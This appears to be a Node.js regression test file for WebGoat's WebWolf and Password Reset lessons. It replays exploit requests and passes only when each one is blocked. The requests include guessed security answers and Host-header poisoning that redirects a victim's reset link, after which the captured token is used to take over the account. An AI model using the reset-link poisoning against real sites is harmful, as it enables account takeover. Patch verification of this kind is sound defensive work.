/**
 * WebWolf Introduction (A07) and Password Reset (A07). Pass-on-patch.
 * Each subtest replays the exact exploit bytes and PASSES only when the exploit
 * is BLOCKED (lesson NOT solved). On the stock vulnerable app these subtests FAIL.
 * The reset-link challenge requires the companion WebWolf service on :9090.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { waitForWebGoat, loginWebGoat, wgFetch, lessonCompleted, WEBWOLF , assertAttackResult } from '../helpers.js';

await waitForWebGoat();
const cookies = await loginWebGoat();

const reverse = (s) => [...s].reverse().join('');

async function webWolfSession() {
  const r = await fetch(`${WEBWOLF}/login`, {
    method: 'POST', redirect: 'manual',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'username=webgoat&password=webgoat',
  });
  const sc = typeof r.headers.getSetCookie === 'function' ? r.headers.getSetCookie() : [];
  for (const c of sc) if (c.startsWith('WEBWOLFSESSION=')) return c.split(';')[0].split('=')[1];
  return null;
}

// ── WebWolf intro ────────────────────────────────────────────────────────────
await test('Challenge-77-WebWolf-Mail', async () => {
  const res = await wgFetch('/WebWolf/mail', {
    cookies, method: 'POST', body: new URLSearchParams({ uniqueCode: reverse('webgoat') }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

await test('Challenge-76-WebWolf-Landing', async () => {
  const res = await wgFetch('/WebWolf/landing', {
    cookies, method: 'POST', body: new URLSearchParams({ uniqueCode: reverse('webgoat') }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

// ── Password Reset ─────────────────────────────────────────────────────────────
await test('Challenge-67-Password-Reset-Questions', async () => {
  // Security-question answer for admin is a guessable colour (green).
  const res = await wgFetch('/PasswordReset/questions', {
    cookies, method: 'POST', body: new URLSearchParams({ username: 'admin', securityQuestion: 'green' }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

await test('Challenge-68-Password-Reset-Weak-Questions', async () => {
  // Submitting two distinct valid questions completes the "weak questions" assignment.
  await wgFetch('/PasswordReset/SecurityQuestions', {
    cookies, method: 'POST', body: new URLSearchParams({ question: 'What is your favorite color?' }),
  });
  const res = await wgFetch('/PasswordReset/SecurityQuestions', {
    cookies, method: 'POST', body: new URLSearchParams({ question: 'What was your childhood nickname?' }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

await test('Challenge-71-Password-Reset-Email', async () => {
  // The "reset" password is just reverse(username).
  const res = await wgFetch('/PasswordReset/simple-mail', {
    cookies, method: 'POST',
    body: new URLSearchParams({ email: 'webgoat@webgoat.org', password: reverse('webgoat') }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

await test('Challenge-70-Password-Reset-Token-Prediction', async () => {
  // Host-header poisoning: point the reset link at WebWolf so the victim's link is delivered there.
  const res = await wgFetch('/PasswordReset/ForgotPassword/create-password-reset-link', {
    cookies, method: 'POST',
    headers: { Host: '127.0.0.1:9090' },
    body: new URLSearchParams({ email: 'tom@webgoat-cloud.org' }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});

await test('Challenge-69-Password-Reset-Login', async () => {
  // Full reset-link takeover: create a link via host-header poisoning, capture the victim's
  // click from the WebWolf request log, change tom's password, then log in as tom.
  const ws = await webWolfSession();
  assert.ok(ws, 'WebWolf login failed (is WebWolf running on :9090?)');

  await wgFetch('/PasswordReset/ForgotPassword/create-password-reset-link', {
    cookies, method: 'POST', headers: { Host: '127.0.0.1:9090' },
    body: new URLSearchParams({ email: 'tom@webgoat-cloud.org' }),
  });
  await new Promise((r) => setTimeout(r, 600));
  const reqs = await (await fetch(`${WEBWOLF}/requests`, { headers: { Cookie: `WEBWOLFSESSION=${ws}` } })).text();
  const links = [...reqs.matchAll(/reset-password\/([0-9a-f-]{36})/g)];
  assert.ok(links.length > 0, 'no reset link captured from WebWolf request log');
  const link = links[links.length - 1][1];

  await wgFetch('/PasswordReset/reset/change-password', {
    cookies, method: 'POST',
    body: new URLSearchParams({ resetLink: link, password: 'hacked123' }),
  });
  const res = await wgFetch('/PasswordReset/reset/login', {
    cookies, method: 'POST',
    body: new URLSearchParams({ email: 'tom@webgoat-cloud.org', password: 'hacked123' }),
  });
  assertAttackResult(res);
  assert.ok(!lessonCompleted(res), 'patched: the exploit must not solve the lesson');
});
